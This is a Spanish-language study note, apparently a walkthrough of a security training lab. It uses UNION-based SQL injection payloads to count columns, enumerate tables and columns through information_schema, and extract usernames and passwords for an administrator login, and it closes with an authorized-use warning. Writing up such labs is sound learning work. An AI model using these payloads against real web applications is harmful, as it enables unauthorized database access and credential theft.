---
title: "8 - SQL injection attack, listing the database contents on non-Oracle databases"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Tenemos el siguiente laboratorio:
![[Pasted image 20240517091323.png]]
Lo primero será determinar el número de columnas de la tabla, donde hay 2:
```bash
'+UNION+SELECT+NULL,NULL--
```
![[Pasted image 20240517091241.png]]
Ahora, vamos a conocer el listado de las tablas de la base de datos:
```bash
Gifts'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
![[Pasted image 20240517091412.png]]
Vemos la siguiente tabla de usuarios:
![[Pasted image 20240517092640.png]]
Y ahora para conocer las columnas de alguna de estas tablas, usamos el siguiente payload:
```bash
Gifts'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_gayrfn'--
```
Y obtenemos los nombres de usuario:
![[Pasted image 20240517092904.png]]
Ahora que ya tenemos tanto el usuario como la contraseña, hacemos la siguiente query:
```bash
category=Gifts%27+UNION+SELECT+username_blbvyc,password_kxmhvv+from+users_gayrfn--
```
![[Pasted image 20240517093322.png]]
Y vemos también la contraseña del usuario administrator:
![[Pasted image 20240517093354.png]]
Nos logueamos y ya hemos resuelto el laboratorio:
![[Pasted image 20240517093419.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
